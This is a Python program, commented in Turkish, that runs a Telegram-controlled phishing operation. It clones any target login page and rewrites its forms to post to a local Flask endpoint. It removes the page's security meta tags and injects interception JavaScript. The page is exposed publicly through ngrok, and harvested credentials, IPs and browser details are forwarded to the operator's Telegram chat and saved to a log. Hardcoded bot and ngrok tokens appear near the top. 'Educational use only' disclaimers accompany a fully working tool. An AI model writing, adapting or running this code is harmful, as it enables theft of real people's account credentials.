#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import json
import requests
import threading
import datetime
from bs4 import BeautifulSoup
from urllib.parse import urlparse, urljoin
import re
import telebot
from telebot import types
import socket
from pyngrok import ngrok, conf, exception
import subprocess
import shutil
import platform
import ssl
from functools import wraps
from colorama import init, Fore, Back, Style

# Renkleri başlat
init(autoreset=True)

# Telegram Bot Token
TOKEN = '7540398038:AAG-6c7WayIPbICTre0xxLc98BYuwvmJ61k'
bot = telebot.TeleBot(TOKEN)

# Kullanıcı verilerini saklamak için
user_data = {}

# Sistem kontrolü
TERMUX_MI = "com.termux" in os.environ.get('PREFIX', '')
WINDOWS_MI = platform.system() == "Windows"
LINUX_MI = platform.system() == "Linux" and not TERMUX_MI

# Ngrok token ayarı
NGROK_AUTH_TOKEN = "2MZRE7FsDM53KMxKyyVrPnEkXdZ_3NdnwopRAQ9ew6yt6LNYZ"

class PhishingServer:
    def __init__(self):
        self.hedef_url = ""
        self.klonlanan_sayfalar = {}
        self.kayit_dosyasi = "yakalanan_veriler.json"
        self.ngrok_tuneli = None
        self.port = 8080
        self.https_kullan = False
        self.flask_thread = None
        self.sunucu_calisiyor = False
        self.current_user = None

    def telegram_bildirim_gonder(self, mesaj, parse_mode='HTML'):
        try:
            bot.send_message(self.current_user, mesaj, parse_mode=parse_mode)
        except Exception as e:
            print(Fore.RED + f"[!] Telegram bildirim gönderilemedi: {str(e)}")

    def verileri_sil(self):
        try:
            if os.path.exists(self.kayit_dosyasi):
                os.remove(self.kayit_dosyasi)
                return True
            return False
        except Exception as e:
            print(Fore.RED + f"[!] Veriler silinirken hata oluştu: {str(e)}")
            return False

    def ngrok_ayarla(self):
        try:
            conf.get_default().auth_token = NGROK_AUTH_TOKEN
            self.telegram_bildirim_gonder("✅ Ngrok token başarıyla ayarlandı!")
            return True
        except Exception as e:
            self.telegram_bildirim_gonder(f"❌ Ngrok token ayarlanamadı: {str(e)}")
            return False

    def proxy_icerik_al(self, url):
        basliklar = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'Referer': self.hedef_url if self.hedef_url else url
        }
        
        try:
            oturum = requests.Session()
            yanit = oturum.get(url, headers=basliklar, timeout=10, verify=False)
            
            if yanit.status_code == 200:
                if 'charset' in yanit.headers.get('content-type', '').lower():
                    encoding = re.search(r'charset=([\w-]+)', yanit.headers['content-type']).group(1)
                else:
                    encoding = yanit.apparent_encoding
                    
                icerik = yanit.content.decode(encoding or 'utf-8', errors='replace')
                return icerik.encode('utf-8'), yanit.headers.get('Content-Type', '')
            else:
                self.telegram_bildirim_gonder(f"❌ Hedef {yanit.status_code} durum kodu döndürdü")
                return None, None
        except requests.exceptions.RequestException as e:
            self.telegram_bildirim_gonder(f"❌ İstek hatası: {str(e)}")
            return None, None
        except Exception as e:
            self.telegram_bildirim_gonder(f"❌ Beklenmeyen hata: {str(e)}")
            return None, None

    def sayfa_duzenle(self, icerik, temel_url):
        try:
            corba = BeautifulSoup(icerik, 'html.parser')
            temel_netloc = urlparse(temel_url).netloc
            
            for form in corba.find_all('form'):
                orjinal_aksiyon = form.get('action', '')
                if not orjinal_aksiyon.startswith(('http://', 'https://')):
                    orjinal_aksiyon = urljoin(temel_url, orjinal_aksiyon)
                
                gizli_girdi = corba.new_tag('input')
                gizli_girdi['type'] = 'hidden'
                gizli_girdi['name'] = '__phishing_kaynak'
                gizli_girdi['value'] = temel_netloc
                form.append(gizli_girdi)
                
                form['action'] = '/gonder'
                form['method'] = 'post'
                form['data-orjinal-aksiyon'] = orjinal_aksiyon
            
            js_script = corba.new_tag('script')
            js_script.string = """
            document.addEventListener('submit', function(e) {
                if(e.target.method.toLowerCase() === 'get') {
                    e.preventDefault();
                    const form = e.target;
                    const formData = new FormData(form);
                    const action = form.getAttribute('data-orjinal-aksiyon');
                    
                    fetch('/gonder', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/x-www-form-urlencoded',
                        },
                        body: new URLSearchParams(formData).toString()
                    }).then(() => {
                        window.location.href = action + (action.includes('?') ? '&' : '?') + new URLSearchParams(formData).toString();
                    });
                }
            });
            """
            corba.body.append(js_script)
            
            for meta in corba.find_all('meta'):
                if 'http-equiv' in meta.attrs and meta['http-equiv'].lower() in ['content-security-policy', 'x-frame-options']:
                    meta.decompose()
            
            for etiket in corba.find_all(['a', 'link', 'script', 'img', 'iframe']):
                for ozellik in ['href', 'src', 'content']:
                    if etiket.has_attr(ozellik):
                        url = etiket[ozellik]
                        if url.startswith('//'):
                            etiket[ozellik] = 'https:' + url
                        elif not url.startswith(('http://', 'https://', 'data:', 'javascript:')):
                            etiket[ozellik] = urljoin(temel_url, url)
            
            return str(corba)
        except Exception as e:
            self.telegram_bildirim_gonder(f"❌ Sayfa düzenleme hatası: {str(e)}")
            return icerik.decode('utf-8') if isinstance(icerik, bytes) else icerik

    def yerel_ip_al(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('10.255.255.255', 1))
            ip = s.getsockname()[0]
        except:
            ip = '127.0.0.1'
        finally:
            s.close()
        return ip

    def kendinden_imzali_sertifika_olustur(self):
        if not os.path.exists('sertifika.pem') or not os.path.exists('anahtar.pem'):
            self.telegram_bildirim_gonder("🔐 Kendi imzalı SSL sertifikası oluşturuluyor...")
            try:
                if not shutil.which('openssl'):
                    self.telegram_bildirim_gonder("⚠️ OpenSSL bulunamadı, otomatik sertifika kullanılacak")
                    return False
                    
                komut = 'openssl req -x509 -newkey rsa:2048 -nodes -keyout anahtar.pem -out sertifika.pem -days 365 -subj "/CN=localhost"'
                subprocess.run(komut.split() if not WINDOWS_MI else komut, 
                             check=True,
                             shell=WINDOWS_MI,
                             stdout=subprocess.DEVNULL,
                             stderr=subprocess.DEVNULL)
                self.telegram_bildirim_gonder("✅ SSL sertifikaları başarıyla oluşturuldu!")
                return True
            except subprocess.CalledProcessError as e:
                self.telegram_bildirim_gonder(f"❌ Sertifika oluşturma hatası: {e.stderr.decode().strip()}")
                return False
            except Exception as e:
                self.telegram_bildirim_gonder(f"❌ Sertifika oluşturma hatası: {str(e)}")
                return False
        return True

    def ngrok_baslat(self, port):
        try:
            conf.get_default().region = "eu"
            conf.get_default().monitor_thread = False
            
            try:
                ngrok.kill()
            except:
                pass
            
            try:
                if self.https_kullan:
                    self.ngrok_tuneli = ngrok.connect(port, bind_tls=True)
                    genel_url = self.ngrok_tuneli.public_url.replace('http://', 'https://')
                else:
                    self.ngrok_tuneli = ngrok.connect(port)
                    genel_url = self.ngrok_tuneli.public_url
                
                self.telegram_bildirim_gonder(f"✅ Ngrok başarıyla başlatıldı!\n\n🌐 Ngrok URL: <code>{genel_url}</code>")
                return genel_url
            except exception.PyngrokNgrokError as e:
                if "account limit" in str(e).lower():
                    self.telegram_bildirim_gonder("⚠️ Ngrok ücretsiz sürümünde aynı anda sadece 1 tünel açabilirsiniz")
                else:
                    self.telegram_bildirim_gonder(f"❌ Ngrok hatası: {str(e)}")
            except Exception as e:
                self.telegram_bildirim_gonder(f"❌ Beklenmeyen hata: {str(e)}")
        except Exception as e:
            self.telegram_bildirim_gonder(f"❌ Ngrok başlatma hatası: {str(e)}")
        return None

    def temizlik(self):
        if self.ngrok_tuneli:
            try:
                ngrok.kill()
                self.telegram_bildirim_gonder("🔴 Ngrok tüneli kapatıldı")
            except Exception as e:
                self.telegram_bildirim_gonder(f"⚠️ Ngrok kapatma hatası: {str(e)}")
        
        if self.flask_thread and self.flask_thread.is_alive():
            try:
                requests.get(f"http://127.0.0.1:{self.port}/kapat", timeout=2)
                self.flask_thread.join(timeout=2)
            except:
                pass

    def flask_calistir(self):
        from flask import Flask, request, redirect, Response
        app = Flask(__name__)
        app.secret_key = os.urandom(24)

        @app.route('/')
        def ana_sayfa():
            if self.hedef_url in self.klonlanan_sayfalar:
                return Response(self.klonlanan_sayfalar[self.hedef_url], mimetype='text/html')
            return redirect(self.hedef_url)

        @app.route('/gonder', methods=['POST'])
        def gonder():
            try:
                form_verisi = request.form.to_dict()
                kaynak = form_verisi.pop('__phishing_kaynak', request.referrer or urlparse(self.hedef_url).netloc)
                
                kayit = {
                    'zaman': datetime.datetime.now().isoformat(),
                    'kaynak': kaynak,
                    'ip': request.remote_addr,
                    'tarayici': request.headers.get('User-Agent', ''),
                    'veri': form_verisi
                }
                
                mesaj = f"""
🔔 <b>Yeni Kimlik Bilgisi Yakalandı!</b>

📌 <b>Kaynak:</b> {kaynak}
🌐 <b>IP Adresi:</b> <code>{request.remote_addr}</code>
🕒 <b>Zaman:</b> {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

📋 <b>Veriler:</b>
"""
                for anahtar, deger in form_verisi.items():
                    mesaj += f"🔑 <b>{anahtar}:</b> <code>{deger}</code>\n"
                
                self.telegram_bildirim_gonder(mesaj)
                
                try:
                    mevcut_veri = []
                    if os.path.exists(self.kayit_dosyasi):
                        with open(self.kayit_dosyasi, 'r', encoding='utf-8') as f:
                            mevcut_veri = json.load(f)
                    
                    mevcut_veri.append(kayit)
                    
                    with open(self.kayit_dosyasi, 'w', encoding='utf-8') as f:
                        json.dump(mevcut_veri, f, indent=2, ensure_ascii=False)
                except Exception as e:
                    self.telegram_bildirim_gonder(f"⚠️ Kayıt hatası: {str(e)}")
                
                return redirect(f"https://{kaynak}", code=302)
            except Exception as e:
                self.telegram_bildirim_gonder(f"⚠️ Form işleme hatası: {str(e)}")
                return redirect(self.hedef_url)

        @app.route('/kapat')
        def kapat():
            """Flask sunucusunu kapatmak için özel endpoint"""
            func = request.environ.get('werkzeug.server.shutdown')
            if func:
                func()
            return 'Sunucu kapatılıyor...'

        try:
            if self.https_kullan:
                context = None
                if os.path.exists('sertifika.pem') and os.path.exists('anahtar.pem'):
                    context = ('sertifika.pem', 'anahtar.pem')
                else:
                    context = 'adhoc'
                
                app.run(host='0.0.0.0', port=self.port, threaded=True, ssl_context=context)
            else:
                app.run(host='0.0.0.0', port=self.port, threaded=True)
        except Exception as e:
            self.telegram_bildirim_gonder(f"❌ Flask sunucu hatası: {str(e)}")

# Global server instance
server = PhishingServer()

def print_startup_message():
    """Başlangıç mesajını göster"""
    print(Fore.GREEN + "\n[+] Phishing Botu Başlatılıyor..." + Style.RESET_ALL)
    print(Fore.YELLOW + "[!] Geliştirici bilgileri Telegram botuna gönderildi")
    print(Fore.CYAN + "[*] Lütfen Telegram hesabınıza giderek botu kullanmaya başlayın\n")
    print(Fore.MAGENTA + "🔗 Telegram'da botu açmak için: " + Fore.WHITE + "https://t.me/pyhton_tools_bot")
    print(Fore.RED + "⚠️ UYARI: " + Fore.WHITE + "Bu araç yalnızca yasal ve etik amaçlarla kullanılmalıdır!\n")

# Telegram Bot Handlers
@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    server.current_user = message.chat.id
    
    # Geliştirici bilgilerini gönder
    info_msg = """
🔹 <b>Geliştirici Bilgileri</b> 🔹

📸 Instagram: <code>@gokhan.yakut.04</code>
🎥 YouTube: <code>https://www.youtube.com/@Bygokhanyakut</code>
💻 GitHub: <code>https://github.com/Byyazilimci</code>

📌 <b>Açıklama:</b> Bu bot ile phishing testleri yapabilirsiniz.
⚠️ <b>Uyarı:</b> Sadece yasal ve etik amaçlarla kullanın!

Botu kullanmaya başlamak için aşağıdaki butonları kullanın.
"""
    bot.send_message(message.chat.id, info_msg, parse_mode='HTML')
    
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    btn1 = types.KeyboardButton('🆕 Yeni Phishing Başlat')
    btn2 = types.KeyboardButton('🛑 Sunucuyu Durdur')
    btn3 = types.KeyboardButton('📊 Yakalanan Veriler')
    btn4 = types.KeyboardButton('🗑️ Yakalanan Verileri Sil')
    markup.add(btn1, btn2, btn3, btn4)
    
    bot.send_message(
        message.chat.id,
        f"👋 <b>Phishing Botuna Hoşgeldiniz!</b>\n\n"
        "Bu bot ile phishing sayfaları oluşturabilir ve yakalanan verileri takip edebilirsiniz.\n\n"
        "🆕 <b>Yeni Phishing Başlat</b> - Yeni bir phishing sayfası oluştur\n"
        "🛑 <b>Sunucuyu Durdur</b> - Çalışan sunucuyu kapat\n"
        "📊 <b>Yakalanan Veriler</b> - Yakalanan kimlik bilgilerini göster\n"
        "🗑️ <b>Yakalanan Verileri Sil</b> - Tüm kayıtları temizle\n\n"
        "⚠️ <i>Sadece eğitim amaçlı kullanın!</i>",
        parse_mode='HTML',
        reply_markup=markup
    )

@bot.message_handler(func=lambda message: message.text == '🆕 Yeni Phishing Başlat')
def start_phishing(message):
    server.current_user = message.chat.id
    msg = bot.send_message(message.chat.id, "🌐 <b>Hedef URL girin:</b>\n\nÖrnek: <code>https://example.com/giris</code>", parse_mode='HTML')
    bot.register_next_step_handler(msg, process_target_url)

def process_target_url(message):
    try:
        url = message.text.strip()
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
            
        yanit = requests.head(url, timeout=5, verify=False)
        if yanit.status_code < 400:
            server.hedef_url = url
            server.telegram_bildirim_gonder(f"🎯 <b>Hedef URL Belirlendi:</b>\n\n<code>{url}</code>")
            
            # Sayfayı klonla
            icerik, icerik_turu = server.proxy_icerik_al(url)
            if icerik:
                server.klonlanan_sayfalar[url] = server.sayfa_duzenle(icerik, url)
                server.telegram_bildirim_gonder("✅ Sayfa başarıyla klonlandı!")
                
                # Protokol seçimi
                markup = types.InlineKeyboardMarkup()
                markup.add(
                    types.InlineKeyboardButton('🔓 HTTP', callback_data='protocol_http'),
                    types.InlineKeyboardButton('🔐 HTTPS', callback_data='protocol_https')
                )
                bot.send_message(
                    message.chat.id,
                    "🔒 <b>Protokol Seçin:</b>\n\n"
                    "🔓 <b>HTTP</b> - Daha hızlı, basit\n"
                    "🔐 <b>HTTPS</b> - Daha güvenli (SSL sertifikası gerekli)",
                    parse_mode='HTML',
                    reply_markup=markup
                )
            else:
                bot.send_message(message.chat.id, "❌ Sayfa klonlanamadı! Lütfen geçerli bir URL girin.")
        else:
            bot.send_message(message.chat.id, f"❌ URL'ye ulaşılamıyor (HTTP {yanit.status_code})")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Hata: {str(e)}")

@bot.callback_query_handler(func=lambda call: call.data.startswith('protocol_'))
def protocol_callback(call):
    if call.data == 'protocol_http':
        server.https_kullan = False
        bot.send_message(call.message.chat.id, "🔓 <b>HTTP protokolü seçildi</b>", parse_mode='HTML')
    elif call.data == 'protocol_https':
        server.https_kullan = True
        if server.kendinden_imzali_sertifika_olustur():
            bot.send_message(call.message.chat.id, "🔐 <b>HTTPS protokolü seçildi</b>\n\nSSL sertifikaları oluşturuldu!", parse_mode='HTML')
        else:
            bot.send_message(call.message.chat.id, "⚠️ <b>HTTPS kurulumu başarısız, HTTP olarak devam ediliyor</b>", parse_mode='HTML')
            server.https_kullan = False
    
    msg = bot.send_message(call.message.chat.id, "🔌 <b>Port numarası girin:</b>\n\nVarsayılan: <code>8080</code>", parse_mode='HTML')
    bot.register_next_step_handler(msg, process_port)

def process_port(message):
    try:
        port = int(message.text.strip() or '8080')
        if 1 <= port <= 65535:
            server.port = port
            
            markup = types.InlineKeyboardMarkup()
            markup.add(
                types.InlineKeyboardButton('🏠 Yerel Ağ', callback_data='local_only'),
                types.InlineKeyboardButton('🌍 Yerel + Ngrok', callback_data='with_ngrok')
            )
            
            bot.send_message(
                message.chat.id,
                "🌐 <b>Bağlantı Türü Seçin:</b>\n\n"
                "🏠 <b>Yerel Ağ</b> - Sadece yerel ağda erişilebilir\n"
                "🌍 <b>Yerel + Ngrok</b> - Genel internet erişimi (Ngrok gerektirir)",
                parse_mode='HTML',
                reply_markup=markup
            )
        else:
            bot.send_message(message.chat.id, "❌ Port 1-65535 aralığında olmalıdır!")
    except ValueError:
        bot.send_message(message.chat.id, "❌ Geçersiz port numarası!")

@bot.callback_query_handler(func=lambda call: call.data in ['local_only', 'with_ngrok'])
def connection_callback(call):
    if call.data == 'local_only':
        # Sadece yerel ağ
        server.flask_thread = threading.Thread(target=server.flask_calistir, daemon=True)
        server.flask_thread.start()
        server.sunucu_calisiyor = True
        
        yerel_ip = server.yerel_ip_al()
        protokol = "https" if server.https_kullan else "http"
        
        bot.send_message(
            call.message.chat.id,
            f"✅ <b>Phishing Sunucusu Başlatıldı!</b>\n\n"
            f"🌐 <b>Yerel IP:</b> <code>{protokol}://{yerel_ip}:{server.port}</code>\n"
            f"💻 <b>Yerel Makine:</b> <code>{protokol}://localhost:{server.port}</code>\n\n"
            f"🛑 Durdurmak için <b>Sunucuyu Durdur</b> butonunu kullanın.",
            parse_mode='HTML'
        )
    elif call.data == 'with_ngrok':
        # Ngrok ile birlikte
        if server.ngrok_ayarla():
            server.flask_thread = threading.Thread(target=server.flask_calistir, daemon=True)
            server.flask_thread.start()
            server.sunucu_calisiyor = True
            
            yerel_ip = server.yerel_ip_al()
            protokol = "https" if server.https_kullan else "http"
            genel_url = server.ngrok_baslat(server.port)
            
            if genel_url:
                bot.send_message(
                    call.message.chat.id,
                    f"✅ <b>Phishing Sunucusu Başlatıldı!</b>\n\n"
                    f"🌐 <b>Yerel IP:</b> <code>{protokol}://{yerel_ip}:{server.port}</code>\n"
                    f"💻 <b>Yerel Makine:</b> <code>{protokol}://localhost:{server.port}</code>\n"
                    f"🌍 <b>Ngrok URL:</b> <code>{genel_url}</code>\n\n"
                    f"🛑 Durdurmak için <b>Sunucuyu Durdur</b> butonunu kullanın.",
                    parse_mode='HTML'
                )
            else:
                bot.send_message(
                    call.message.chat.id,
                    "⚠️ <b>Ngrok başlatılamadı, sadece yerel ağ kullanılabilir</b>\n\n"
                    f"🌐 <b>Yerel IP:</b> <code>{protokol}://{yerel_ip}:{server.port}</code>\n"
                    f"💻 <b>Yerel Makine:</b> <code>{protokol}://localhost:{server.port}</code>",
                    parse_mode='HTML'
                )

@bot.message_handler(func=lambda message: message.text == '🛑 Sunucuyu Durdur')
def stop_server(message):
    if server.sunucu_calisiyor:
        server.temizlik()
        server.sunucu_calisiyor = False
        bot.send_message(message.chat.id, "🔴 <b>Sunucu başarıyla durduruldu</b>", parse_mode='HTML')
    else:
        bot.send_message(message.chat.id, "ℹ️ <b>Zaten çalışan bir sunucu yok</b>", parse_mode='HTML')

@bot.message_handler(func=lambda message: message.text == '📊 Yakalanan Veriler')
def show_logs(message):
    try:
        if os.path.exists(server.kayit_dosyasi):
            with open(server.kayit_dosyasi, 'r', encoding='utf-8') as f:
                veriler = json.load(f)
            
            if veriler:
                for i, veri in enumerate(veriler[-5:], 1):  # Son 5 kaydı göster
                    mesaj = f"""
📌 <b>Kayıt #{i}</b>
⏰ <b>Zaman:</b> {veri['zaman']}
🌐 <b>Kaynak:</b> {veri['kaynak']}
📡 <b>IP:</b> <code>{veri['ip']}</code>
🖥 <b>Tarayıcı:</b> {veri['tarayici']}

📋 <b>Veriler:</b>
"""
                    for anahtar, deger in veri['veri'].items():
                        mesaj += f"🔑 <b>{anahtar}:</b> <code>{deger}</code>\n"
                    
                    bot.send_message(message.chat.id, mesaj, parse_mode='HTML')
            else:
                bot.send_message(message.chat.id, "ℹ️ <b>Henüz yakalanan veri yok</b>", parse_mode='HTML')
        else:
            bot.send_message(message.chat.id, "ℹ️ <b>Henüz yakalanan veri yok</b>", parse_mode='HTML')
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ <b>Hata:</b> {str(e)}", parse_mode='HTML')

@bot.message_handler(func=lambda message: message.text == '🗑️ Yakalanan Verileri Sil')
def delete_logs(message):
    if server.verileri_sil():
        bot.send_message(message.chat.id, "✅ <b>Yakalanan tüm veriler başarıyla silindi!</b>", parse_mode='HTML')
    else:
        bot.send_message(message.chat.id, "ℹ️ <b>Silinecek veri bulunamadı</b>", parse_mode='HTML')

def main():
    try:
        print_startup_message()  # Yeni başlangıç mesajını göster
        print(Fore.GREEN + "[+] Telegram botu başlatılıyor..." + Style.RESET_ALL)
        bot.polling(none_stop=True)
    except Exception as e:
        print(Fore.RED + f"[!] Bot çalışırken hata oluştu: {str(e)}" + Style.RESET_ALL)
        sys.exit(1)

if __name__ == '__main__':
    main()